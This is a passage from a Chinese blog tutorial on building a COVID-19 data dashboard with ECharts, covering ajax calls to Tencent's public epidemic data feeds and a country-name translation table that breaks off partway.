class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formaDate = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">    <span class="keyword">var</span> year = d.getFullYear(), <span class="comment">//多变量赋值</span></span><br><span class="line">        month = d.getMonth() + <span class="number">1</span>, <span class="comment">//month：从0开始</span></span><br><span class="line">        date = d.getDate(),</span><br><span class="line">        hour = d.getHours(),</span><br><span class="line">        minute = d.getMinutes(),</span><br><span class="line">        second = d.getSeconds();</span><br><span class="line"></span><br><span class="line">    year = year &lt; <span class="number">10</span> ? <span class="string">'0'</span> + year : year; <span class="comment">//三元操作符</span></span><br><span class="line">    month = month &lt; <span class="number">10</span> ? <span class="string">'0'</span> + month : month;</span><br><span class="line">    date = date &lt; <span class="number">10</span> ? <span class="string">'0'</span> + date : date;</span><br><span class="line">    hour = hour &lt; <span class="number">10</span> ? <span class="string">'0'</span> + hour : hour;</span><br><span class="line">    minute = minute &lt; <span class="number">10</span> ? <span class="string">'0'</span> + minute : minute;</span><br><span class="line">    second = second &lt; <span class="number">10</span> ? <span class="string">'0'</span> + second : second;</span><br><span class="line">    <span class="keyword">var</span> a = year + <span class="string">'-'</span> + month + <span class="string">'-'</span> + date + <span class="string">' '</span> + hour + <span class="string">':'</span> + minute + <span class="string">':'</span> + second</span><br><span class="line">    $(<span class="string">'.showTime'</span>).html(a); <span class="comment">//显示时间</span></span><br><span class="line">&#125;</span><br><span class="line">setInterval(formaDate, <span class="number">1000</span>) <span class="comment">//设定定时器，循环运行;</span></span><br></pre></td></tr></table></figure><p>成果：</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/%E5%85%A8%E7%90%83%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE/image-20200720151351065.png" alt="image-20200720151351065"></p><h1 id="数据获取（重点）"><a href="#数据获取（重点）" class="headerlink" title="数据获取（重点）"></a>数据获取（重点）</h1><p>前面的页面搭建到此就结束了，如果你想搭建自己的页面，当然可以不用去看上面那个，自己搭一个属于自己的疫情界面，我主要是因为懒且合理的疫情地图布局大多如此，所以我直接引用之前学习的地图并相应修改了下，如果想了解上面地图的详细做法，可以去看我的<a href="https://ypigy.gitee.io/2020/07/20/Echarts/" target="_blank" rel="noopener">Echarts</a>那篇博客，或者直接去<a href="https://www.bilibili.com/video/BV1v7411R7mp" target="_blank" rel="noopener">这里</a>学习。</p><p>在这里，数据获取，我百度了很多，其中有一个是自己搭建实时接口然后去调用其数据，教程链接<a href="http://ncov.leafcoder.cn/docs/#/?id=country-list" target="_blank" rel="noopener">新冠肺炎实时接口</a>。这里需要有一定的爬虫基础以及其它知识，然后就可以设计出一个自己的<strong>本地</strong>疫情接口，数据来源是丁香园。本地本地，就意味着你要将这个服务的端口号映射到外网才能给其他互联网小伙伴访问（或者其他方式），所以暂时被我（还是懒）pass掉了，但是它是值得一学的</p><p>然后我就发现了一个，它里面有一些示例链接，点进去居然可以访问数据，然后我就想到，是否可以直接在前端使用ajax去调用这些数据并将其渲染到页面上。说完我便开始动手了，敲代码，分析数据格式，获取数据，飞快的敲打着键盘，并且成功了，是的，在本地是成功了，然后发布到自己的博客上发现，访问不了，what？？？，我打开了控制台，看到了红色警示语—<strong>阻止载入混合内容</strong>，好吧，这是啥我也不懂，就去百度了，发现这个关系到数据加密的问题，可以参考这篇<a href="https://www.cnblogs.com/lxwphp/p/10238945.html" target="_blank" rel="noopener">博客</a>，反正就是我在http后面加一个s也还是不行，然后我放弃了</p><p>我想到了这是用丁香园的数据，然后便去看了丁香园的实时疫情，但是当我打开f12时发现，丁香是直接一股脑在服务器处理好了，好滴吧，打扰了，腾讯呢，我打起了腾讯的主意，打开f12，f5以下，哇<del>~</del>，这也太棒了吧，腾讯把它的数据拿到前端来处理了，yes，好滴，然后这里就讲一下怎么得到腾讯的疫情数据接口</p><ol><li><p>第一步，打开<a href="https://news.qq.com/zt2020/page/feiyan.htm#/global?nojump=1&pool=bj" target="_blank" rel="noopener">腾讯实时疫情</a>网址（这不废话吗）</p></li><li><p>f12一下，点击网络（network），然后再刷新一下，把你在网站上看到的某个疫情数据，确诊数，死亡数，啥的都可以通过ctri + f查找一下</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/%E5%85%A8%E7%90%83%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE/image-20200720101241595.png" alt="image-20200720101241595"></p></li><li><p>然后，你就可以得到它数据的url啦，也记住一下它的请求方式，然后复制一下这个网址，到新标签页访问一下，粗略阅览一下是否有符合自己需求的数据，有的话就可以接下一步了</p></li><li><p>我这里一共调用了腾讯3个接口（hiahiahia<del>~</del>）</p><ul><li><a href="https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5" target="_blank" rel="noopener">https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5</a> （国内疫情）</li><li><a href="https://api.inews.qq.com/newsqa/v1/automation/modules/list?modules=FAutoGlobalStatis,FAutoContinentStatis,FAutoGlobalDailyList,FAutoCountryConfirmAdd" target="_blank" rel="noopener">https://api.inews.qq.com/newsqa/v1/automation/modules/list?modules=FAutoGlobalStatis,FAutoContinentStatis,FAutoGlobalDailyList,FAutoCountryConfirmAdd</a> （海外每日疫情）</li><li><a href="https://api.inews.qq.com/newsqa/v1/automation/foreign/country/ranklist" target="_blank" rel="noopener">https://api.inews.qq.com/newsqa/v1/automation/foreign/country/ranklist</a> （其他国家疫情状况）</li></ul></li></ol><h1 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h1><p>到这里，疫情数据就已经获取到了，接下来就是怎么处理这些数据了，首先，我上了Echarts官网找了符合自己想要的图表，然后分别将这些图表实例引入自己的index.js文件里，然后你就要逐个分析，看每个图表所需要的数据类型分别是怎样的</p><h2 id="南丁格尔玫瑰图、仿人民日报玫瑰图"><a href="#南丁格尔玫瑰图、仿人民日报玫瑰图" class="headerlink" title="南丁格尔玫瑰图、仿人民日报玫瑰图"></a>南丁格尔玫瑰图、仿人民日报玫瑰图</h2><p>南丁格尔玫瑰图所需要的数据格式是数组中加对象，大致如下，仿人民日报玫瑰图的格式也类似</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data: [</span><br><span class="line">    &#123;<span class="attr">value</span>: <span class="number">10</span>, <span class="attr">name</span>: <span class="string">'rose1'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">value</span>: <span class="number">5</span>, <span class="attr">name</span>: <span class="string">'rose2'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">value</span>: <span class="number">15</span>, <span class="attr">name</span>: <span class="string">'rose3'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">value</span>: <span class="number">25</span>, <span class="attr">name</span>: <span class="string">'rose4'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">value</span>: <span class="number">20</span>, <span class="attr">name</span>: <span class="string">'rose5'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">value</span>: <span class="number">35</span>, <span class="attr">name</span>: <span class="string">'rose6'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">value</span>: <span class="number">30</span>, <span class="attr">name</span>: <span class="string">'rose7'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">value</span>: <span class="number">40</span>, <span class="attr">name</span>: <span class="string">'rose8'</span>&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里是要制作各洲疫情状况，所以console了返回的json数据后分析了一下，所需要的各洲最新疫情确诊在data.data.FAutoContinentStatis[a]中的最后一个数组里（a为最后一个），然后就用接下来的代码去获取自己所需要的数据并push到显示在页面的数组里（请忽略定时器）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = data.data.FAutoContinentStatis.length - <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> contines = data.data.FAutoContinentStatis[a].statis</span><br><span class="line"><span class="keyword">var</span> con = <span class="built_in">Object</span>.keys(contines)</span><br><span class="line"><span class="keyword">var</span> sum = <span class="built_in">Object</span>.values(contines)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; con.length; i++) &#123;</span><br><span class="line">    count.push(&#123; <span class="attr">value</span>: sum[i], <span class="attr">name</span>: con[i] &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>南丁格尔玫瑰图完整代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = [];</span><br><span class="line"><span class="keyword">var</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="comment">// url: 'https://111.231.75.86:8000/api/countries/', //联网失败</span></span><br><span class="line">        url: <span class="string">'https://api.inews.qq.com/newsqa/v1/automation/modules/list?modules=FAutoGlobalStatis,FAutoContinentStatis,FAutoGlobalDailyList,FAutoCountryConfirmAdd'</span>,</span><br><span class="line">        type: <span class="string">'get'</span>,</span><br><span class="line">        <span class="comment">// data: &#123;&#125;,</span></span><br><span class="line">        dataType: <span class="string">'json'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> a = data.data.FAutoContinentStatis.length - <span class="number">1</span></span><br><span class="line">            <span class="keyword">var</span> contines = data.data.FAutoContinentStatis[a].statis</span><br><span class="line">            <span class="keyword">var</span> con = <span class="built_in">Object</span>.keys(contines)</span><br><span class="line">            <span class="keyword">var</span> sum = <span class="built_in">Object</span>.values(contines)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; con.length; i++) &#123;</span><br><span class="line">                count.push(&#123; <span class="attr">value</span>: sum[i], <span class="attr">name</span>: con[i] &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//必须在这里在设置一遍，这里涉及到的问题不太懂，只知道如不再设置，而在ajax外赋值是没有作用的</span></span><br><span class="line">            myChart.setOption(&#123; <span class="comment">//加载数据图表</span></span><br><span class="line">                series: [&#123;</span><br><span class="line">                    data: count</span><br><span class="line">                &#125;]</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    setInterval(ajax, <span class="number">3600000</span>) <span class="comment">//设定定时器，循环运行;</span></span><br><span class="line">&#125;</span><br><span class="line">ajax()</span><br></pre></td></tr></table></figure><p>仿人民日报玫瑰图完整代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> virus = [</span><br><span class="line">    [<span class="string">'Country'</span>, <span class="string">'Confirmed'</span>]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'https://api.inews.qq.com/newsqa/v1/automation/foreign/country/ranklist'</span>,</span><br><span class="line">        type: <span class="string">'get'</span>,</span><br><span class="line">        dataType: <span class="string">'json'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> num = data.data</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">                virus.push([num[i].name, num[i].confirm])</span><br><span class="line">            &#125;</span><br><span class="line">            myChart.setOption(&#123; <span class="comment">//加载数据图表</span></span><br><span class="line">                dataset: &#123;</span><br><span class="line">                    source: virus</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    setInterval(ajax, <span class="number">3600000</span>) <span class="comment">//设定定时器，循环运行;</span></span><br><span class="line">&#125;</span><br><span class="line">ajax()</span><br></pre></td></tr></table></figure><h2 id="折线图"><a href="#折线图" class="headerlink" title="折线图"></a>折线图</h2><p>折线图所需要的数据格式为数组，x轴一组，y轴两组，大致如下，x轴与y轴数据必须一一对应</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">series: [&#123;</span><br><span class="line">    data: []</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    data: []</span><br><span class="line">&#125;],</span><br><span class="line">xAxis: [&#123;</span><br><span class="line">    data: []</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><p>这里需要用到全球每日的疫情数据用来显示其趋势，数据处理思路同上面的南丁格尔玫瑰图，只是需要定义三个数组用来接收数据，ajax’完整代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = []</span><br><span class="line"><span class="keyword">var</span> count1 = []</span><br><span class="line"><span class="keyword">var</span> date = []</span><br><span class="line"><span class="keyword">var</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'https://api.inews.qq.com/newsqa/v1/automation/modules/list?modules=FAutoGlobalStatis,FAutoContinentStatis,FAutoGlobalDailyList,FAutoCountryConfirmAdd'</span>,</span><br><span class="line">        type: <span class="string">'get'</span>,</span><br><span class="line">        <span class="comment">// data: &#123;&#125;,</span></span><br><span class="line">        dataType: <span class="string">'json'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> qushi = data.data.FAutoGlobalDailyList</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; qushi.length; i++) &#123;</span><br><span class="line">                count.push(qushi[i].all.confirm)</span><br><span class="line">                count1.push(qushi[i].all.dead)</span><br><span class="line">                date.push(qushi[i].date)</span><br><span class="line">            &#125;</span><br><span class="line">            myChart.setOption(&#123; <span class="comment">//加载数据图表</span></span><br><span class="line">                series: [&#123;</span><br><span class="line">                    data: count</span><br><span class="line">                &#125;, &#123;</span><br><span class="line">                    data: count1</span><br><span class="line">                &#125;],</span><br><span class="line">                xAxis: [&#123;</span><br><span class="line">                    data: date</span><br><span class="line">                &#125;]</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    setInterval(ajax, <span class="number">3600000</span>) <span class="comment">//设定定时器，循环运行;</span></span><br><span class="line">&#125;</span><br><span class="line">ajax()</span><br></pre></td></tr></table></figure><h2 id="地图模块"><a href="#地图模块" class="headerlink" title="地图模块"></a>地图模块</h2><p>地图模块所需要的数据格式同南丁格尔玫瑰图一致，但是内置地图模块的国家名为英文，所以需要为每个英文国家名定义中文，转化代码如下，参考地址<a href="https://blog.csdn.net/qq_27747997/article/details/89710859，并对获取到的疫情数据的国家名进行对应修改" target="_blank" rel="noopener">https://blog.csdn.net/qq_27747997/article/details/89710859，并对获取到的疫情数据的国家名进行对应修改</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"Canada"</span>: <span class="string">"加拿大"</span>,</span><br><span class="line">    <span class="string">"Turkmenistan"</span>: <span class="string">"土库曼斯坦"</span>,</span><br><span class="line">    <span class="string">"Saint Helena"</span>: <span class="string">"圣赫勒拿"</span>,</span><br><span class="line">    <span class="string">"Lao PDR"</span>: <span class="string">"老挝"</span>,</span><br><span class="line">    <span class="string">"Lithuania"</span>: <span class="string">"立陶宛"</span>,</span><br><span class="line">    <span class="string">"Cambodia"</span>: <span class="string">"柬埔寨"</span>,</span><br><span class="line">    <span class="string">"Ethiopia"</span>: <span class="string">"埃塞俄比亚"</span>,</span><br><span class="line">    <span class="string">"Faeroe Is."</span>: <span class="string">"法罗群岛"</span>,</span><br><span class="line">    <span class="string">"Swaziland"</span>: <span class="string">"斯威士兰"</span>,</span><br><span class="line">    <span class="string">"Palestine"</span>: <span class="string">"巴勒斯坦"</span>,</span><br><span class="line">    <span class="string">"Belize"</span>: <span class="string">"伯利兹"</span>,</span><br><span class="line">    <span class="string">"Argentina"</span>: <span class="string">"阿根廷"</span>,</span><br><span class="line">    <span class="string">"Bolivia"</span>: <span class="string">"玻利维亚"</span>,</span><br><span class="line">    <span class="string">"Cameroon"</span>: <span class="string">"喀麦隆"</span>,</span><br><span class="line">    <span class="string">"Burkina Faso"</span>: <span class="string">"布基纳法索"</span>,</span><br><span class="line">    <span class="string">"Aland"</span>: <span class="string">"奥兰群岛"</span>,</span><br><span class="line">    <span class="string">"Bahrain"</span>: <span class="string">"巴林"</span>,</span><br><span class="line">    <span class="string">"Saudi Arabia"</span>: <span class="string">"沙特阿拉伯"</span>,</span><br><span class="line">    <span class="string">"Fr. Polynesia"</span>: <span class="string">"法属波利尼西亚"</span>,</span><br><span class="line">    <span class="string">"Cape Verde"</span>: <span class="string">"佛得角"</span>,</span><br><span class="line">    <span class="string">"W. Sahara"</span>: <span class="string">"西撒哈拉"</span>,</span><br><span class="line">    <span class="string">"Slovenia"</span>: <span class="string">"斯洛文尼亚"</span>,</span><br><span class="line">    <span class="string">"Guatemala"</span>: <span class="string">"危地马拉"</span>,</span><br><span class="line">    <span class="string">"Guinea"</span>: <span class="string">"几内亚"</span>,</span><br><span class="line">    <span class="string">"Dem. Rep. Congo"</span>: <span class="string">"刚果（金）"</span>,</span><br><span class="line">    <span class="string">"Germany"</span>: <span class="string">"德国"</span>,</span><br><span class="line">    <span class="string">"Spain"</span>: <span class="string">"西班牙"</span>,</span><br><span class="line">    <span class="string">"Liberia"</span>: <span class="string">"利比里亚"</span>,</span><br><span class="line">    <span class="string">"Netherlands"</span>: <span class="string">"荷兰"</span>,</span><br><span class="line">    <span class="string">"Jamaica"</span>: <span class="string">"牙买加"</span>,</span><br><span class="line">    <span class="string">"Solomon Is."</span>: <span class="string">"所罗门群岛"</span>,</span><br><span class="line">    <span class="string">"Oman"</span>: <span class="string">"阿曼"</span>,</span><br><span class="line">    <span class="string">"Tanzania"</span>: <span class="string">"坦桑尼亚"</span>,</span><br><span class="line">    <span class="string">"Costa Rica"</span>: <span class="string">"哥斯达黎加"</span>,</span><br><span class="line">    <span class="string">"Isle of Man"</span>: <span class="string">"曼岛"</span>,</span><br><span class="line">    <span class="string">"Gabon"</span>: <span class="string">"加蓬"</span>,</span><br><span class="line">    <span class="string">"Niue"</span>: <span class="string">"纽埃"</span>,</span><br><span class="line">    <span class="string">"Bahamas"</span>: <span class="string">"巴哈马"</span>,</span><br><span class="line">    <span class="string">"New Zealand"</span>: <span class="string">"新西兰"</span>,</span><br><span class="line">    <span class="string">"Yemen"</span>: <span class="string">"也门"</span>,</span><br><span class="line">    <span class="string">"Jersey"</span>: <span class="string">"泽西岛"</span>,</span><br><span class="line">    <span class="string">"Pakistan"</span>: <span class="string">"巴基斯坦"</span>,</span><br><span class="line">    <span class="string">"Albania"</span>: <span class="string">"阿尔巴尼亚"</span>,</span><br><span class="line">    <span class="string">"Samoa"</span>: <span class="string">"萨摩亚"</span>,</span><br><span class="line">    <span class="string">"Czech Rep."</span>: <span class="string">"捷克"</span>,</span><br><span class="line">    <span class="string">"United Arab Emirates"</span>: <span class="string">"阿拉伯联合酋长国"</span>,</span><br><span class="line">    <span class="string">"Guam"</span>: <span class="string">"关岛"</span>,</span><br><span class="line">    <span class="string">"India"</span>: <span class="string">"印度"</span>,</span><br><span class="line">    <span class="string">"Azerbaijan"</span>: <span class="string">"阿塞拜疆"</span>,</span><br><span class="line">    <span class="string">"N. Mariana Is."</span>: <span class="string">"北马里亚纳群岛"</span>,</span><br><span class="line">    <span class="string">"Lesotho"</span>: <span class="string">"莱索托"</span>,</span><br><span class="line">    <span class="string">"Kenya"</span>: <span class="string">"肯尼亚"</span>,</span><br><span class="line">    <span class="string">"Belarus"</span>: <span class="string">"白俄罗斯"</span>,</span><br><span class="line">    <span class="string">"Tajikistan"</span>: <span class="string">"塔吉克斯坦"</span>,</span><br><span class="line">    <span class="string">"Turkey"</span>: <span class="string">"土耳其"</span>,</span><br><span class="line">    <span class="string">"Afghanistan"</span>: <span class="string">"阿富汗"</span>,</span><br><span class="line">    <span class="string">"Bangladesh"</span>: <span class="string">"孟加拉国"</span>,</span><br><span class="line">    <span class="string">"Mauritania"</span>: <span class="string">"毛里塔尼亚"</span>,</span><br><span class="line">    <span class="string">"Dem. Rep. Korea"</span>: <span class="string">"朝鲜"</span>,</span><br><span class="line">    <span class="string">"Saint Lucia"</span>: <span class="string">"圣卢西亚"</span>,</span><br><span class="line">    <span class="string">"Br. Indian Ocean Ter."</span>: <span class="string">"英属印度洋领地"</span>,</span><br><span class="line">    <span class="string">"Mongolia"</span>: <span class="string">"蒙古"</span>,</span><br><span class="line">    <span class="string">"France"</span>: <span class="string">"法国"</span>,</span><br><span class="line">    <span class="string">"Cura?ao"</span>: <span class="string">"库拉索岛"</span>,</span><br><span class="line">    <span class="string">"S. Sudan"</span>: <span class="string">"南苏丹"</span>,</span><br><span class="line">    <span class="string">"Rwanda"</span>: <span class="string">"卢旺达"</span>,</span><br><span class="line">    <span class="string">"Slovakia"</span>: <span class="string">"斯洛伐克"</span>,</span><br><span class="line">    <span class="string">"Somalia"</span>: <span class="string">"索马里"</span>,</span><br><span class="line">    <span class="string">"Peru"</span>: <span class="string">"秘鲁"</span>,</span><br><span class="line">    <span class="string">"Vanuatu"</span>: <span class="string">"瓦努阿图"</span>,</span><br><span class="line">    <span class="string">"Norway"</span>: <span class="string">"挪威"</span>,</span><br><span class="line">    <span class="string">"Malawi"</span>: <span class="string">"马拉维"</span>,</span><br><span class="line">    <span class="string">"Benin"</span>: <span class="string">"贝宁"</span>,</span><br><span class="line">    <span class="string">"St. Vin. and Gren."</span>: <span class="string">"圣文森特和格林纳丁斯"</span>,</span><br><span class="line">    <span class="string">"Korea"</span>: <span class="string">"韩国"</span>,</span><br><span class="line">    <span class="string">"Singapore"</span>: <span class="string">"新加坡"</span>,</span><br><span class="line">    <span class="string">"Montenegro"</span>: <span class="string">"黑山共和国"</span>,</span><br><span class="line">    <span class="string">"Cayman Is."</span>: <span class="string">"开曼群岛"</span>,</span><br><span class="line">    